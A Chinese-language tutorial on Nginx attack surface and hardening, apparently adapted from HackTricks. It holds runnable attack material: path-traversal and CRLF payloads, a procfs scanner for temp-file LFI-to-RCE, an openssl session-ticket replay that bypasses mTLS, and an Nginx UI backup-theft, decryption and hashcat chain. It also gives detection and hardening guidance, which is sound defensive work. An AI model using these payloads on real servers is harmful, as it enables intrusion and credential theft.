---
attack_surface:
  - 配置缺陷
  - 认证/授权绕过
  - 协议解析差异
  - 缓存/代理逻辑
impact:
  - 远程代码执行
  - 权限提升
  - 信息泄露
  - 机密性破坏
  - 身份伪造
  - 可用性破坏
risk_level: 严重
prerequisites:
  - Nginx 配置语法基础
  - HTTP/1.1 与 HTTP/2 协议理解
  - Linux 文件系统与 procfs 基础
related_techniques:
  - path-traversal
  - lfi-to-rce
  - crlf-injection
  - h2c-smuggling
  - request-splitting
  - session-hijacking
  - dns-spoofing
difficulty: 中级
tools:
  - Gixy-Next
  - Nginxpwner
  - Burp Suite
  - curl
  - openssl
---

# Nginx — Web Server 安全配置与攻击面

> 关联文档：[Apache](../Apache/README.md) · [Proxy & WAF Protections Bypass](../../Proxies/Proxy%20%26%20WAF%20Protections%20Bypass/README.md) · [h2c Smuggling](../../Proxies/HTTP%20Connection%20Contamination/README.md) · [File Inclusion-Path Traversal](../../User%20input/Reflected%20Values/File%20Inclusion-Path%20Traversal/README.md)

---

# 0x01 攻击面分类与原理

> **学习路径**：HTTP 协议基础 → [Apache 安全配置](../Apache/README.md) → 本文 (Nginx) → [h2c Smuggling](../../Proxies/HTTP%20Connection%20Contamination/README.md) → [Proxy & WAF Protections Bypass](../../Proxies/Proxy%20%26%20WAF%20Protections%20Bypass/README.md)
>
> Nginx 路径穿越漏洞的利用链可与 [File Inclusion-Path Traversal](../../User%20input/Reflected%20Values/File%20Inclusion-Path%20Traversal/README.md) 中的通用 LFI 技术结合；CRLF 注入可衔接 [Cache Poisoning](../../Proxies/Cache%20Poisoning%26Cache%20Deception/README.md) 进行持久化投毒。

## 1.1 Nginx 攻击面全景

Nginx 同时承担 Web Server、Reverse Proxy、Load Balancer、Cache 多种角色。其攻击面分布在三个层次：

| 层次 | 攻击面 | 典型漏洞类别 |
|------|--------|-------------|
| 配置层 | 指令组合的语义缺陷 | Alias LFI、try_files 路径穿越、Map 默认值缺失、root 全局暴露 |
| 协议层 | HTTP/2、HTTP/3 (QUIC)、TLS 协议实现缺陷 | Rapid Reset DoS、QUIC worker crash、TLS session resumption bypass |
| 应用层 | Nginx UI 管理面板、第三方模块 | 未授权备份导出、AES 密钥泄露、SSI 变量注入 |

Nginx 漏洞的核心分类依据触发机制：

- **配置缺陷 (Configuration Weakness)** — 配置指令的语义或组合导致安全边界失效，如 `alias` 缺少尾随 `/`、`$uri` 用于重定向
- **协议解析差异 (Parsing Discrepancy)** — CRLF 在 `$uri` 中的解码、无效 HTTP 请求绕过 proxy_intercept_errors
- **认证/授权绕过 (Authentication/Authorization Bypass)** — Map 默认值缺失、TLS 会话跨 vhost 复用
- **缓存/代理逻辑 (Cache/Proxy Logic)** — X-Accel 内部重定向、h2c smuggling 绕过访问控制

## 1.2 配置缺陷 vs 协议层面漏洞

Nginx 安全问题中，**配置缺陷占绝大多数**，但 CVEs 集中在协议实现层。关键区别：

- 配置缺陷：可在黑盒测试中通过 HTTP 请求特征直接检测
- 协议层漏洞：需要特定版本指纹 + 特定条件（如 QUIC 启用、HTTP/2 高并发阈值）
- 两者的交集：`proxy_set_header Upgrade` 配置 + h2c 协议特性 = smuggling 通路

---

# 0x02 配置侦察与指纹识别

## 2.1 版本检测与 QUIC/HTTP3 支持

HTTP/3 是 opt-in 特性，扫描 `Alt-Svc` 响应头或直接对 UDP/443 发起 QUIC 握手：

```bash
nginx -V 2>&1 | grep -i http_v3
rg -n "listen .*quic" /etc/nginx/
```

影响范围：1.25.0–1.25.5、1.26.0 在编译了 `ngx_http_v3_module` 且暴露 `listen ... quic` 时受影响。

## 2.2 配置文件侦察

### 2.2.1 Missing Root Location 信息泄露

当 Nginx 配置中未定义 root location (`location / {...}`)，但定义了特定 location 时，root 指令全局生效：

```bash
server {
        root /etc/nginx;

        location /hello.txt {
                try_files $uri $uri/ =404;
                proxy_pass http://127.0.0.1:8080/;
        }
}
```

`GET /nginx.conf` 可直接读取 `/etc/nginx/nginx.conf`。即使将 root 设为 `/etc`，仍可能泄露配置文件、访问日志、HTTP 基本认证的加密凭据。

### 2.2.2 危险配置检测命令

```bash
# 高亮风险指令
rg -n "http2_max_concurrent_streams" /etc/nginx/
rg -n "keepalive_requests" /etc/nginx/
rg -n "merge_slashes" /etc/nginx/
rg -n "proxy_request_buffering" /etc/nginx/
rg -n "ssl_session_cache" /etc/nginx/
rg -n "ssl_session_tickets" /etc/nginx/
```

---

# 0x03 路径遍历与本地文件包含

## 3.1 Missing Root Location — 全局根目录暴露

**触发条件**：定义了 `root` 指令但未定义 `location / {}`。

```bash
server {
    root /etc/nginx;
    location /hello.txt {
        try_files $uri $uri/ =404;
        proxy_pass http://127.0.0.1:8080/;
    }
}
```

**利用**：`GET /nginx.conf` 返回 `/etc/nginx/nginx.conf`。root 指向 `/etc` 时仍可读取 passwd、shadow 及加密凭据。

此配置缺陷与 [File Inclusion-Path Traversal](../../User%20input/Reflected%20Values/File%20Inclusion-Path%20Traversal/README.md) 中的通用路径穿越原理一致，但触发点位于 Web Server 层而非应用层。

**防御**：始终定义 `location / {}` 限制访问范围，或使用精确 root 路径。

## 3.2 Alias LFI — 路径穿越配置缺陷

**触发条件**：`alias` 指令中的路径缺少尾部 `/`，且对应的 `location` 也缺少尾部 `/`。

```
location /imgs {
    alias /path/images/;
}
```

**攻击原理**：请求 `/imgs../flag.txt` 被解析为 `/path/images/../flag.txt`，实现目录穿越。

**修复**：

```
location /imgs/ {
    alias /path/images/;
}
```

参考：[Acunetix — Path Traversal via Misconfigured Nginx Alias](https://www.acunetix.com/vulnerabilities/web/path-traversal-via-misconfigured-nginx-alias/)

**Acunetix 测试结果**：

```
alias../ => HTTP status code 403
alias.../ => HTTP status code 404
alias../../ => HTTP status code 403
alias../../../../../../../../../../../ => HTTP status code 400
alias../ => HTTP status code 403
```

## 3.3 try_files $uri$args — 查询参数触发的 LFI

**触发条件**：`try_files` 指令中使用 `$uri$args` 变量。

```
location / {
    try_files $uri$args $uri$args/ /index.html;
}
```

**原理**：Nginx 将 `$uri` 和 `$args` 拼接后作为文件路径查找。`$uri` 在 location 上下文中包含请求的文件路径部分（不含查询参数），但当 location 为 `/` 时，`$uri` 就是 `/` + path。同时 `$args` 是完整的 query string，攻击者可通过查询参数注入路径穿越序列。

**攻击载荷**：

```http
GET /?../../../../../../../../etc/passwd HTTP/1.1
Host: example.com
```

**Nginx Debug Log 证据**：

```
2025/07/11 15:49:16 [debug] 79694#79694: *4 trying to use file: "/../../../../../../../../etc/passwd" "/var/www/html/public/../../../../../../../../etc/passwd"
2025/07/11 15:49:16 [debug] 79694#79694: *4 try file uri: "/../../../../../../../../etc/passwd"
2025/07/11 15:49:16 [debug] 79694#79694: *4 http filename: "/var/www/html/public/../../../../../../../../etc/passwd"
2025/07/11 15:49:16 [debug] 79694#79694: *4 HTTP/1.1 200 OK
```

**Burp 请求 PoC**：

![Burp request PoC for try_files LFI](../../hacktricks/src/images/nginx_try_files.png)

> **注意**：此图片来自 hacktricks 源文件，展示 try_files LFI 的 Burp Suite PoC 请求。图片提取和处理将在 P4 阶段执行。

## 3.4 merge_slashes — 路径规范化掩蔽

**默认行为**：`merge_slashes` 默认为 `on`，将 URL 中多个连续斜杠压缩为一个。这会**掩盖**后端应用的路径穿越漏洞。

**风险**：当 Nginx 作为反向代理时，`merge_slashes on` 在转发请求前规范化 URL 路径，使得 `//etc/passwd` 变为 `/etc/passwd`，从而绕过某些依赖多斜杠的 LFI payload。

**建议**：对已知存在 LFI 漏洞的应用，将 `merge_slashes` 设为 `off`，确保 Nginx 不改变 URL 结构，使漏洞不会被中间层掩蔽。

参考：[Danny Robinson and Rotem Bar — Nginx may be protecting your applications from traversal attacks](https://medium.com/appsflyer/nginx-may-be-protecting-your-applications-from-traversal-attacks-without-you-even-knowing-b08f882fd43d)

## 3.5 LFI2RCE via Nginx Temp Files

### 3.5.1 漏洞条件

PHP 运行在 Nginx 反向代理之后，Nginx 配置了请求体缓冲（默认行为），PHP 应用中存在 LFI（`include` 或 `readfile`）：

```php
<?php
$action = $_GET['action'] ?? 'read';
$path   = $_GET['file'] ?? 'index.php';
$action === 'read' ? readfile($path) : include $path;
```

Nginx 默认临时文件路径：`/var/lib/nginx/body`、`/var/lib/nginx/fastcgi`。当请求体或上游响应超过内存缓冲区（约 8 KB）时，Nginx 将数据写入临时文件，**保持文件描述符打开**，仅删除文件名（unlink）。PHP 的 `include` 可跟随 `/proc/<pid>/fd/<fd>` 符号链接执行已 unlink 的内容。

### 3.5.2 为什么要滥用 Temp Files

- 超过缓冲区阈值的请求体被刷入 `client_body_temp_path`（默认 `/tmp/nginx/client-body` 或 `/var/lib/nginx/body`）
- 文件名随机，但文件描述符可通过 `/proc/<nginx_pid>/fd/<fd>` 访问
- 只要请求体未完成传输（或保持 TCP 流挂起），Nginx 保持描述符打开
- PHP 的 `include/require` 解析 `/proc/.../fd/...` 符号链接，即使 Nginx 已删除文件名

### 3.5.3 经典利用流程

1. **枚举 Worker PID**：通过 LFI 提取 `/proc/<pid>/cmdline`，搜索 `nginx: worker process`。Worker 数量通常不超过 CPU 核数，扫描低 PID 空间即可。
2. **强制 Nginx 创建临时文件**：发送超大 POST/PUT 请求体，使 Nginx 溢出到 `/var/lib/nginx/body/XXXXXXXX`。确保后端不完整读取请求体（如 keep-alive 上传线程挂起）。
3. **将描述符映射到文件**：利用 PID 列表生成遍历链，如 `/proc/<pidA>/cwd/proc/<pidB>/root/proc/<pidC>/fd/<fd>`，绕过 `realpath()` 规范化。暴力破解文件描述符 10–45 通常足够（Nginx 在此范围内复用 body temp file fd）。
4. **Include 执行**：命中仍指向缓冲体的描述符时，单个 `include` 或 `require` 执行 payload——即使原始文件名已被 unlink。仅需文件读取时切换为 `readfile()`。

### 3.5.4 现代变体 (2024–2025) — IngressNightmare

CVE-2025-1974 ("IngressNightmare") 示范了经典 temp-file 技巧的演进：

- 攻击者推送恶意共享对象（.so）作为请求体。由于体量 >8 KB，Nginx 缓冲至 `/tmp/nginx/client-body/cfg-<random>`
- 通过在 `Content-Length` 中虚报大小（如声明 1 MB 且永不发送最后 chunk），临时文件保持约 60 秒
- 脆弱的 ingress-nginx 模板代码允许向生成的 Nginx 配置注入指令
- 结合 lingering temp file：暴力破解 `/proc/<pid>/fd/<fd>` 链 → 发现缓冲的 shared object
- 注入 `ssl_engine /proc/<pid>/fd/<fd>;` 强制 Nginx 加载缓冲 .so → 构造器内 RCE → Kubernetes secrets 暴露

### 3.5.5 Procfs 扫描器

<details>
<summary>Quick procfs scanner</summary>

```python
#!/usr/bin/env python3
import os

def find_tempfds(pid_range=range(100, 4000), fd_range=range(10, 80)):
    for pid in pid_range:
        fd_dir = f"/proc/{pid}/fd"
        if not os.path.isdir(fd_dir):
            continue
        for fd in fd_range:
            try:
                path = os.readlink(f"{fd_dir}/{fd}")
                if "client-body" in path or "nginx" in path:
                    yield pid, fd, path
            except OSError:
                continue

for pid, fd, path in find_tempfds():
    print(f"use ?file=/proc/{pid}/fd/{fd}  # {path}")
```

</details>

### 3.5.6 实战注意事项

- Nginx 禁用缓冲时（`proxy_request_buffering off`、`client_body_buffer_size` 调高、`proxy_max_temp_file_size 0`），技术大幅受限——始终枚举配置文件和响应头确认缓冲状态
- 挂起上传嘈杂但有效：多进程并发 Flood worker，确保至少一个临时文件在 LFI 暴力破解期间存留
- Kubernetes 环境中权限边界不同但原始操作一致：将字节注入 Nginx 缓冲区，从任何文件读取可达的位置遍历 `/proc`

**实验环境**：
- [bierbaumer.net — PHP LFI with Nginx assistance (lab)](https://bierbaumer.net/security/php-lfi-with-nginx-assistance/php-lfi-with-nginx-assistance.tar.xz)
- [CTF Challenge 1](https://2021.ctf.link/internal/challenge/ed0208cd-f91a-4260-912f-97733e8990fd/)
- [CTF Challenge 2](https://2021.ctf.link/internal/challenge/a67e2921-e09a-4bfa-8e7e-11c51ac5ee32/)

---

# 0x04 HTTP 请求拆分与响应头注入

## 4.1 $uri 变量 CRLF 注入

### 4.1.1 漏洞机制

> [!CAUTION]
> 危险变量：`$uri` 和 `$document_uri`。修复方式：替换为 `$request_uri`。
>
> 正则也可能存在漏洞：
> `location ~ /docs/([^/])? { … $1 … }` — 存在漏洞
> `location ~ /docs/([^/\s])? { … $1 … }` — 无漏洞（检查空白字符）
> `location ~ /docs/(.*)? { … $1 … }` — 无漏洞

示例漏洞配置：

```
location / {
  return 302 https://example.com$uri;
}
```

`\r` (Carriage Return) 和 `\n` (Line Feed) 的 URL 编码形式为 `%0d%0a`。将这两个字符包含在请求中（如 `http://localhost/%0d%0aDetectify:%20clrf`），服务器响应中会出现新 header `Detectify: clrf`。这是因为 `$uri` 变量对 URL 编码的换行字符进行了解码：

```http
HTTP/1.1 302 Moved Temporarily
Server: nginx/1.19.3
Content-Type: text/html
Content-Length: 145
Connection: keep-alive
Location: https://example.com/
Detectify: clrf
```

参考：[Detectify — HTTP Response Splitting Exploitations and Mitigations](https://blog.detectify.com/2019/06/14/http-response-splitting-exploitations-and-mitigations/)

### 4.1.2 黑盒检测方法

演讲 [Nginx misconfig detection (YouTube)](https://www.youtube.com/watch?v=gWQyWdZbdoY&list=PL0xCSYnG_iTtJe2V6PQqamBF73n7-f1Nr&index=77) 提供了黑盒检测方法：

- `https://example.com/%20X` — 任意 HTTP 状态码（X 被解释为 HTTP method）
- `https://example.com/%20H` — 400 Bad Request（H 不是有效 method）

服务器收到类似 `GET / H HTTP/1.1` 的请求并触发错误。

另一种检测方式：

- `http://company.tld/%20HTTP/1.1%0D%0AXXXX:%20x` — 任意 HTTP 状态码
- `http://company.tld/%20HTTP/1.1%0D%0AHost:%20x` — 400 Bad Request

### 4.1.3 已发现的漏洞配置示例

- **`$uri` 直接设置在最终 URL 中**：

```
location ^~ /lite/api/ {
 proxy_pass http://lite-backend$uri$is_args$args;
}
```

- **`$uri` 在 URL 参数内部**：

```
location ~ ^/dna/payment {
 rewrite ^/dna/([^/]+) /registered/main.pl?cmd=unifiedPayment&context=$1&native_uri=$uri break;
 proxy_pass http://$back;
}
```

- **AWS S3 代理**：

```
location /s3/ {
 proxy_pass https://company-bucket.s3.amazonaws.com$uri;
}
```

## 4.2 SSI 过滤器变量注入

**触发条件**：用户提供的数据在特定情况下被当作 Nginx 变量处理。根因为 Nginx SSI (Server Side Includes) 过滤器模块。

参考：[HackerOne Report #370094](https://hackerone.com/reports/370094)，问题定位在 [ngx_http_ssi_filter_module.c#L365](https://github.com/nginx/nginx/blob/2187586207e1465d289ae64cedc829719a048a39/src/http/modules/ngx_http_ssi_filter_module.c#L365)。

**检测命令**：

```bash
$ curl -H 'Referer: bar' http://localhost/foo$http_referer | grep 'foobar'
```

跨系统扫描发现存在多个可被用户打印 Nginx 变量的实例，但漏洞实例数量呈下降趋势。

## 4.3 Raw Backend Response — 无效 HTTP 请求绕过

**触发条件**：`proxy_intercept_errors on` + `proxy_hide_header` 配置。

Nginx 通过 `proxy_pass` 提供错误拦截和 HTTP header 隐藏功能。但当 Nginx 收到**无效 HTTP 请求**时，请求被原样转发至后端，后端的**原始响应直接发送给客户端**，绕过 Nginx 的干预。

示例：uWSGI 应用返回敏感头：

```python
def application(environ, start_response):
    start_response('500 Error', [('Content-Type', 'text/html'), ('Secret-Header', 'secret-info')])
    return [b"Secret info, should not be visible!"]
```

Nginx 配置意图隐藏错误和敏感头：

```
http {
    error_page 500 /html/error.html;
    proxy_intercept_errors on;
    proxy_hide_header Secret-Header;
}
```

- **proxy_intercept_errors**：对状态码 >300 的后端响应提供自定义错误页
- **proxy_hide_header**：隐藏指定 HTTP header

正常 `GET` 请求：Nginx 返回标准错误页，不泄露 `Secret-Header`。无效 HTTP 请求：绕过此机制，后端原始响应（含 `Secret-Header: secret-info`）直接返回客户端。

## 4.4 恶意响应头 — X-Accel 系列

以下响应头来自后端时，会改变 Nginx 代理行为（参考 [Nginx X-Accel 文档](https://www.nginx.com/resources/wiki/start/topics/examples/x-accel/)）：

| Header | 行为 |
|--------|------|
| `X-Accel-Redirect` | 触发 Nginx 内部重定向到指定位置 |
| `X-Accel-Buffering` | 控制 Nginx 是否缓冲响应 |
| `X-Accel-Charset` | 设置 X-Accel-Redirect 响应的字符集 |
| `X-Accel-Expires` | 设置 X-Accel-Redirect 响应的过期时间 |
| `X-Accel-Limit-Rate` | 限制 X-Accel-Redirect 响应的传输速率 |

**X-Accel-Redirect 的路径穿越**：如果 Nginx 配置中有类似 `root /` 的设置，后端的 `X-Accel-Redirect: .env` 响应头将使 Nginx 发送 `/.env` 的内容——即通过内部重定向实现路径穿越。

参考：[mizu.re — CORS Playground](https://mizu.re/post/cors-playground)

---

# 0x05 访问控制与认证绕过

## 5.1 Map 指令默认值缺失 → 授权绕过

`map` 指令常用于授权控制。**未指定 `default` 值是常见错误**，导致未授权访问：

```yaml
http {
map $uri $mappocallow {
/map-poc/private 0;
/map-poc/secret 0;
/map-poc/public 1;
}
}
```

```yaml
server {
    location /map-poc {
        if ($mappocallow = 0) {return 403;}
        return 200 "Hello. It is private area: $mappocallow";
    }
}
```

攻击者访问 `/map-poc` 下未定义的 URI（未被任何 map 条目覆盖），`$mappocallow` 为空字符串，不等于 `0`，绕过 403 检查。[Nginx map 模块手册](https://nginx.org/en/docs/http/ngx_http_map_module.html) 建议始终设置 `default` 值。

## 5.2 Unsafe Path Restriction Bypass

检查如何绕过以下限制：

```plaintext
location = /admin {
    deny all;
}

location = /admin/ {
    deny all;
}
```

绕过技术参考 `proxy-waf-protections-bypass.md`。

## 5.3 TLS 会话恢复绕过客户端证书认证 (CVE-2025-23419)

2025 年 2 月公告：Nginx 1.11.4–1.27.3（使用 OpenSSL）允许**从一个基于名称的虚拟主机复用 TLS 1.3 会话到另一个**。已协商无证书主机的客户端可以重放 ticket/PSK 跳入受 `ssl_verify_client on;` 保护的 vhost，完全绕过 mTLS。

**触发条件**：多个虚拟主机共享相同的 TLS 1.3 会话缓存和 tickets。

**攻击流程**：

```bash
# 1. 在公开 vhost 上创建 TLS 会话并保存 session ticket
openssl s_client -connect public.example.com:443 -sess_out ticket.pem

# 2. 在 ticket 过期前重放到 mTLS vhost
openssl s_client -connect admin.example.com:443 -sess_in ticket.pem -ign_eof
```

若目标存在漏洞，第二次握手在未提供客户端证书的情况下完成，暴露受保护的位置。

**审计要点**：
- 混用 `server_name` 块且共享 `ssl_session_cache shared:SSL` + `ssl_session_tickets on;`
- admin/API 块期望 mTLS 但继承了公共主机的共享 session cache/ticket 设置
- 自动化工具（Ansible 等）全局启用 TLS 1.3 session resumption 而未考虑 vhost 隔离

参考：[nginx-announce 2025 advisory](https://mailman.nginx.org/pipermail/nginx-announce/2025/NYEUJX7NCBCGJGXDFVXNMAAMJDFSE45G.html)

## 5.4 proxy_set_header Upgrade → h2c Smuggling

如果 Nginx 配置传递 Upgrade 和 Connection header，可执行 [h2c Smuggling 攻击](../../Proxies/HTTP%20Connection%20Contamination/README.md) 访问受保护/内部端点。

> [!CAUTION]
> 此漏洞允许攻击者与 `proxy_pass` 端点建立**直接连接**（此处为 `http://backend:9999`），其内容不经过 Nginx 检查。

漏洞配置示例（窃取 `/flag`，来自 [BishopFox](https://bishopfox.com/blog/h2c-smuggling-request)）：

```
server {
    listen       443 ssl;
    server_name  localhost;

    ssl_certificate       /usr/local/nginx/conf/cert.pem;
    ssl_certificate_key   /usr/local/nginx/conf/privkey.pem;

    location / {
     proxy_pass http://backend:9999;
     proxy_http_version 1.1;
     proxy_set_header Upgrade $http_upgrade;
     proxy_set_header Connection $http_connection;
    }

    location /flag {
     deny all;
    }
```

> [!WARNING]
> 即使 `proxy_pass` 指向特定**路径**（如 `http://backend:9999/socket.io`），连接建立的目标仍是 `http://backend:9999`，攻击者可访问该内部端点的**任意其他路径**。`proxy_pass` URL 中指定的路径无效。

---

# 0x06 拒绝服务攻击

## 6.1 HTTP/3 QUIC 模块远程 DoS 与内存泄漏 (CVE-2024 系列)

2024 年 Nginx 披露 CVE-2024-31079、CVE-2024-32760、CVE-2024-34161、CVE-2024-35200：**单个恶意 QUIC 会话**可导致 worker 进程崩溃或内存泄漏。条件：编译了实验性 `ngx_http_v3_module` 且暴露 `listen ... quic` socket。

| 受影响 | 修复版本 |
|--------|---------|
| 1.25.0–1.25.5、1.26.0 | 1.27.0 / 1.26.1 |

**CVE-2024-34161**（内存泄漏）额外要求 MTU >4096 字节才能泄露敏感数据。

**侦察与利用提示**：
- HTTP/3 为 opt-in：扫描 `Alt-Svc: h3=":443"` 响应，或对 UDP/443 进行 QUIC 握手暴力探测
- 确认后可构造 `quiche-client`/`nghttp3` 定制 payload，fuzz 握手和 STREAM 帧触发 worker 崩溃和日志泄漏

```bash
nginx -V 2>&1 | grep -i http_v3
rg -n "listen .*quic" /etc/nginx/
```

参考：[nginx-announce 2024 advisory](https://mailman.nginx.org/pipermail/nginx-announce/2024/GWH2WZDVCOC2A5X67GKIMJM4YRELTR77.html)

## 6.2 HTTP/2 Rapid Reset (CVE-2023-44487)

HTTP/2 Rapid Reset 攻击在运维人员调高 `keepalive_requests` 或 `http2_max_concurrent_streams` 后仍影响 Nginx。攻击方式：单连接发起数千 stream 后立即发送 `RST_STREAM`，使并发限制永不触发但 CPU 持续消耗在 tear-down 逻辑。

**Nginx 默认值**（128 concurrent streams、1000 keepalive requests）将影响范围保持在较小水平；大幅调高则使单客户端即可耗尽 worker。

**检测**：

```bash
rg -n "http2_max_concurrent_streams" /etc/nginx/
rg -n "keepalive_requests" /etc/nginx/
```

参考：[F5 — HTTP/2 Rapid Reset Attack Impacting F5 NGINX Products](https://www.f5.com/company/blog/nginx/http-2-rapid-reset-attack-impacting-f5-nginx-products)

---

# 0x07 管理界面与供应链攻击

## 7.1 Nginx UI 未授权备份导出与密钥泄露

**Nginx UI** 是独立的 Nginx 管理面板（非 Nginx 守护进程）。**Nginx UI < 2.3.3** 中，备份导出端点可能无需认证即可访问，且响应中通过 `X-Backup-Security` header 泄露**AES-256-CBC 密钥和 IV**。这将"加密备份下载"转化为即时的**凭据/Token/私钥泄露**。

### 7.1.1 SPA 版本指纹

若登录页是 JS 重 SPA，从 `/` 拉取主 bundle 寻找版本 chunk：

```bash
curl -s http://admin.example/ | grep -oP 'assets/index-[^"]+\.js'
curl -s http://admin.example/assets/index-<hash>.js | grep -oP 'version[-\\w]*\\.js'
curl -s http://admin.example/assets/version-<hash>.js
```

在存在漏洞的 Nginx UI 构建上，通常返回类似 `const t="2.3.2"` 的字面量，认证前即可匹配漏洞范围。

### 7.1.2 暴露 API 检查与备份获取

即使大部分 `/api/*` 路由返回 `403`，直接测试备份端点：

```bash
curl -s http://admin.example/api/install
curl -s -D headers.txt -o backup.zip http://admin.example/api/backup
grep -i '^X-Backup-Security:' headers.txt
unzip -l backup.zip
```

若存在漏洞，`X-Backup-Security` 包含 `base64(key):base64(iv)`。解码并确认预期长度（**32 字节 key**、**16 字节 IV**）：

```bash
KEY_B64='<base64-key>'; IV_B64='<base64-iv>'
KEY_HEX=$(printf '%s' "$KEY_B64" | base64 -d | xxd -p -c 0)
IV_HEX=$(printf '%s' "$IV_B64" | base64 -d | xxd -p -c 0)
unzip backup.zip -d backup
openssl enc -aes-256-cbc -d -in backup/hash_info.txt -out hash_info.txt -K "$KEY_HEX" -iv "$IV_HEX"
openssl enc -aes-256-cbc -d -in backup/nginx.zip -out nginx_dec.zip -K "$KEY_HEX" -iv "$IV_HEX"
openssl enc -aes-256-cbc -d -in backup/nginx-ui.zip -out nginx-ui_dec.zip -K "$KEY_HEX" -iv "$IV_HEX"
```

### 7.1.3 解密后利用路径

- 从 `nginx_dec.zip` 提取反向代理和 vhost 详情
- 检查 `nginx-ui_dec.zip` 中的 `app.ini`、`database.db`、API Token、证书材料
- 导出 SQLite `users` 表并离线破解密码哈希

```bash
unzip nginx-ui_dec.zip -d nginx-ui
sqlite3 nginx-ui/database.db 'select name,password from users;'
hashcat -m 3200 hashes.txt <wordlist>
```

> [!NOTE]
> 此模式值得在其他管理产品中测试：**未认证的"加密"导出在响应泄露解密材料或与归档一起存储时，等同于明文泄露。**

参考：[GitHub Advisory GHSA-g9w5-qffc-6762](https://github.com/0xJacky/nginx-ui/security/advisories/GHSA-g9w5-qffc-6762)、[CVE-2026-27944](https://nvd.nist.gov/vuln/detail/CVE-2026-27944)

## 7.2 DNS 欺骗与 resolver 指令

Nginx 可通过 `resolver` 指令指定 DNS 服务器：

```yaml
resolver 8.8.8.8;
```

若攻击者知道 Nginx 使用的 DNS 服务器且可拦截 DNS 查询，可伪造 DNS 记录。Nginx 配置 `resolver 127.0.0.1` 缓解此风险。

参考：[blog.zorinaq.com — Nginx Resolver Vulns](http://blog.zorinaq.com/nginx-resolver-vulns/)

---

# 0x0A 检测、防御与安全工具

## A.1 静态配置分析工具

### GIXY / Gixy-Next / gixy-ng

| 工具 | 状态 | 用途 |
|------|------|------|
| [Gixy-Next](https://gixy.io/) | GIXY 更新 fork | 发现漏洞、不安全指令、风险配置、性能问题、加固机会 |
| [gixy-ng](https://github.com/dvershinin/gixy) | 活跃维护 fork | 功能同上，社区维护版本 |
| [GIXY](https://github.com/yandex/gixy) | 原始版本 | Yandex 开发，主项目不再活跃 |

参考：[GIXY Issue #115](https://github.com/yandex/gixy/issues/115)

### Nginxpwner

[Nginxpwner](https://github.com/stark0de/nginxpwner) — 用于查找常见 Nginx 配置错误和漏洞的简单工具。

## A.2 黑盒检测方法论

### 路径穿越测试

```
# alias LFI 探测
GET /imgs../etc/passwd HTTP/1.1

# try_files LFI 探测
GET /?../../../../etc/passwd HTTP/1.1

# merge_slashes 绕过探测
GET ////etc/passwd HTTP/1.1
```

### CRLF 注入测试

```bash
# $uri CRLF 检测
curl -s -o /dev/null -w "%{http_code}" "https://target/%20X"
curl -s -o /dev/null -w "%{http_code}" "https://target/%20H"
# 第一个返回任意状态码、第二个返回 400 → 可能存在漏洞

# 高级检测
curl -s "https://target/%20HTTP/1.1%0D%0ATest:%20x"
```

### SSI 变量注入测试

```bash
curl -H 'Referer: bar' http://target/foo$http_referer | grep 'foobar'
```

### Nginx UI 检测

```bash
curl -s http://target/api/install
curl -s -D headers.txt http://target/api/backup
grep -i '^X-Backup-Security:' headers.txt
```

## A.3 加固建议清单

| 配置项 | 不安全值 | 建议值 | 原因 |
|--------|---------|--------|------|
| `merge_slashes` | `on` (默认) | `off` | 避免掩盖后端路径穿越漏洞 |
| `proxy_intercept_errors` | `on` | 评估需求 | 配合无效 HTTP 请求可绕过 |
| $uri 用于 `return`/`proxy_pass` | 使用 `$uri` | 使用 `$request_uri` | 防止 CRLF 注入 |
| `map` 指令 | 无 `default` | 始终提供 `default` | 防止授权绕过 |
| `alias` 尾部 `/` | `location /x { alias /path/; }` | `location /x/ { alias /path/; }` | 防止路径穿越 |
| `proxy_set_header Upgrade` | 传递给后端 | 如不需要则移除 | 防止 h2c smuggling |
| `ssl_session_tickets` | 跨 vhost 共享 | `off` 或按 vhost 隔离 | 防止 CVE-2025-23419 |
| `resolver` | 外部 DNS | `127.0.0.1` | 防止 DNS 欺骗 |
| `keepalive_requests` | 大幅高于 1000 | 保持默认 (1000) | 防止 HTTP/2 Rapid Reset |
| `http2_max_concurrent_streams` | 大幅高于 128 | 保持默认 (128) | 防止 HTTP/2 Rapid Reset |
| `client_body_buffer_size` | 极大值 | 保持默认或适度调大 | 维持 temp file 滥用屏障 |
| Nginx UI | 暴露公网 | 严格访问控制 + 定期更新 | 防止未授权备份导出 |

### 实验环境

[Detectify vulnerable-nginx](https://github.com/detectify/vulnerable-nginx) — Docker 化的漏洞 Nginx 测试环境，包含本文中讨论的部分配置错误。

---

## 参考资料

- [Detectify — Common Nginx Misconfigurations](https://blog.detectify.com/2020/11/10/common-nginx-misconfigurations/)
- [bierbaumer.net — PHP LFI with Nginx Assistance](https://bierbaumer.net/security/php-lfi-with-nginx-assistance/)
- [Acunetix — Path Traversal via Misconfigured Nginx Alias](https://www.acunetix.com/vulnerabilities/web/path-traversal-via-misconfigured-nginx-alias/)
- [Detectify — HTTP Response Splitting Exploitations and Mitigations](https://blog.detectify.com/2019/06/14/http-response-splitting-exploitations-and-mitigations/)
- [HackerOne Report #370094 — Nginx Variable Print](https://hackerone.com/reports/370094)
- [Nginx SSI Filter Module Source](https://github.com/nginx/nginx/blob/2187586207e1465d289ae64cedc829719a048a39/src/http/modules/ngx_http_ssi_filter_module.c#L365)
- [Nginx X-Accel Documentation](https://www.nginx.com/resources/wiki/start/topics/examples/x-accel/)
- [mizu.re — CORS Playground](https://mizu.re/post/cors-playground)
- [BishopFox — h2c Smuggling Request](https://bishopfox.com/blog/h2c-smuggling-request)
- [Danny Robinson and Rotem Bar — Nginx Traversal Protection](https://medium.com/appsflyer/nginx-may-be-protecting-your-applications-from-traversal-attacks-without-you-even-knowing-b08f882fd43d)
- [Nginx Map Module Manual](https://nginx.org/en/docs/http/ngx_http_map_module.html)
- [nginx-announce 2024 — QUIC CVEs](https://mailman.nginx.org/pipermail/nginx-announce/2024/GWH2WZDVCOC2A5X67GKIMJM4YRELTR77.html)
- [nginx-announce 2025 — TLS Session Resumption CVE](https://mailman.nginx.org/pipermail/nginx-announce/2025/NYEUJX7NCBCGJGXDFVXNMAAMJDFSE45G.html)
- [F5 — HTTP/2 Rapid Reset Attack](https://www.f5.com/company/blog/nginx/http-2-rapid-reset-attack-impacting-f5-nginx-products)
- [CVE-2026-27944 — NIST NVD](https://nvd.nist.gov/vuln/detail/CVE-2026-27944)
- [GitHub Advisory — Nginx UI GHSA-g9w5-qffc-6762](https://github.com/0xJacky/nginx-ui/security/advisories/GHSA-g9w5-qffc-6762)
- [blog.zorinaq.com — Nginx Resolver Vulns](http://blog.zorinaq.com/nginx-resolver-vulns/)
